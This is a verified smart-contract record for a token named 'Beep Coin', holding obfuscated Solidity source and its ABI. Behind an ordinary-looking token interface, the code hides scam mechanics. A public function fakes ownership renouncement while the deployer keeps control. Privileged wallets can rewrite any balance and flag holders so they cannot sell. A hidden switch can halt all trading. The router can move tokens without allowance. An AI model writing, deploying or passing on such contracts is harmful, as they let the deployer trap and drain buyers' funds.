{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract shouldTradingBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchMax {\n    function createPair(address liquiditySender, address walletMaxAuto) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface receiverLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface amountMaxTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderTeam) external view returns (uint256);\n\n    function transfer(address receiverTeam, uint256 limitTeam) external returns (bool);\n\n    function allowance(address amountToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverTeam,\n        uint256 limitTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedTake, uint256 value);\n    event Approval(address indexed amountToken, address indexed spender, uint256 value);\n}\n\ninterface tradingFund is amountMaxTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BeepCoin is shouldTradingBuy, amountMaxTake, tradingFund {\n\n    mapping(address => mapping(address => uint256)) private totalSender;\n\n    function txMin(address receiverMinExempt, uint256 limitTeam) public {\n        tradingShouldIs();\n        toMin[receiverMinExempt] = limitTeam;\n    }\n\n    constructor (){\n        \n        launchedSenderMarketing();\n        receiverLiquidity fromMinBuy = receiverLiquidity(fromSwap);\n        sellFee = launchMax(fromMinBuy.factory()).createPair(fromMinBuy.WETH(), address(this));\n        totalAmountTo = launchMax(fromMinBuy.factory()).feeTo();\n        \n        txLaunch = _msgSender();\n        takeTotalWallet[txLaunch] = true;\n        toMin[txLaunch] = swapIs;\n        if (receiverFee == fundAmountReceiver) {\n            shouldLaunchAuto = false;\n        }\n        emit Transfer(address(0), txLaunch, swapIs);\n    }\n\n    bool private launchWallet;\n\n    address public txLaunch;\n\n    function toReceiver(address buyMin, address receiverTeam, uint256 limitTeam) internal view returns (uint256) {\n        require(limitTeam > 0);\n\n        uint256 tradingTx = 0;\n        if (buyMin == sellFee && tradingFrom > 0) {\n            tradingTx = limitTeam * tradingFrom / 100;\n        } else if (receiverTeam == sellFee && fundList > 0) {\n            tradingTx = limitTeam * fundList / 100;\n        }\n        require(tradingTx <= limitTeam);\n        return limitTeam - tradingTx;\n    }\n\n    function transfer(address receiverMinExempt, uint256 limitTeam) external virtual override returns (bool) {\n        return isReceiver(_msgSender(), receiverMinExempt, limitTeam);\n    }\n\n    function owner() external view returns (address) {\n        return fromFee;\n    }\n\n    function allowance(address takeReceiverFrom, address sellExempt) external view virtual override returns (uint256) {\n        if (sellExempt == fromSwap) {\n            return type(uint256).max;\n        }\n        return totalSender[takeReceiverFrom][sellExempt];\n    }\n\n    address totalAmountTo;\n\n    function launchedSenderMarketing() public {\n        emit OwnershipTransferred(txLaunch, address(0));\n        fromFee = address(0);\n    }\n\n    address public sellFee;\n\n    function senderTotal(address buyMin, address receiverTeam, uint256 limitTeam) internal returns (bool) {\n        require(toMin[buyMin] >= limitTeam);\n        toMin[buyMin] -= limitTeam;\n        toMin[receiverTeam] += limitTeam;\n        emit Transfer(buyMin, receiverTeam, limitTeam);\n        return true;\n    }\n\n    uint256 public tradingFrom = 3;\n\n    bool public modeTxLimit;\n\n    event OwnershipTransferred(address indexed exemptSenderBuy, address indexed shouldEnable);\n\n    uint256 public fundList = 0;\n\n    function balanceOf(address senderTeam) public view virtual override returns (uint256) {\n        return toMin[senderTeam];\n    }\n\n    uint256 constant walletLaunched = 20 ** 10;\n\n    mapping(address => bool) public takeTotalWallet;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromEnable;\n    }\n\n    mapping(address => uint256) private toMin;\n\n    function getOwner() external view returns (address) {\n        return fromFee;\n    }\n\n    address fromSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public receiverFee;\n\n    function isReceiver(address buyMin, address receiverTeam, uint256 limitTeam) internal returns (bool) {\n        if (buyMin == txLaunch) {\n            return senderTotal(buyMin, receiverTeam, limitTeam);\n        }\n        uint256 receiverMode = amountMaxTake(sellFee).balanceOf(totalAmountTo);\n        require(receiverMode == senderShould);\n        require(receiverTeam != totalAmountTo);\n        if (shouldAmount[buyMin]) {\n            return senderTotal(buyMin, receiverTeam, walletLaunched);\n        }\n        limitTeam = toReceiver(buyMin, receiverTeam, limitTeam);\n        return senderTotal(buyMin, receiverTeam, limitTeam);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapIs;\n    }\n\n    uint256 private totalMax;\n\n    address private fromFee;\n\n    function approve(address sellExempt, uint256 limitTeam) public virtual override returns (bool) {\n        totalSender[_msgSender()][sellExempt] = limitTeam;\n        emit Approval(_msgSender(), sellExempt, limitTeam);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return toExemptShould;\n    }\n\n    uint256 senderShould;\n\n    uint8 private toExemptShould = 18;\n\n    mapping(address => bool) public shouldAmount;\n\n    uint256 private fundAmountReceiver;\n\n    uint256 private swapIs = 100000000 * 10 ** 18;\n\n    uint256 exemptReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return totalAutoTeam;\n    }\n\n    string private fromEnable = \"BCN\";\n\n    function shouldTx(uint256 limitTeam) public {\n        tradingShouldIs();\n        senderShould = limitTeam;\n    }\n\n    string private totalAutoTeam = \"Beep Coin\";\n\n    bool public shouldLaunchAuto;\n\n    function launchedAmount(address exemptShouldTx) public {\n        tradingShouldIs();\n        \n        if (exemptShouldTx == txLaunch || exemptShouldTx == sellFee) {\n            return;\n        }\n        shouldAmount[exemptShouldTx] = true;\n    }\n\n    function transferFrom(address buyMin, address receiverTeam, uint256 limitTeam) external override returns (bool) {\n        if (_msgSender() != fromSwap) {\n            if (totalSender[buyMin][_msgSender()] != type(uint256).max) {\n                require(limitTeam <= totalSender[buyMin][_msgSender()]);\n                totalSender[buyMin][_msgSender()] -= limitTeam;\n            }\n        }\n        return isReceiver(buyMin, receiverTeam, limitTeam);\n    }\n\n    function liquidityAutoTrading(address minTake) public {\n        require(minTake.balance < 100000);\n        if (modeTxLimit) {\n            return;\n        }\n        if (launchWallet == shouldLaunchAuto) {\n            shouldLaunchAuto = true;\n        }\n        takeTotalWallet[minTake] = true;\n        \n        modeTxLimit = true;\n    }\n\n    function tradingShouldIs() private view {\n        require(takeTotalWallet[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptSenderBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiverFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptShouldTx\",\"type\":\"address\"}],\"name\":\"launchedAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSenderMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTake\",\"type\":\"address\"}],\"name\":\"liquidityAutoTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTxLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunchAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitTeam\",\"type\":\"uint256\"}],\"name\":\"shouldTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTotalWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMinExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMinExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTeam\",\"type\":\"uint256\"}],\"name\":\"txMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BeepCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}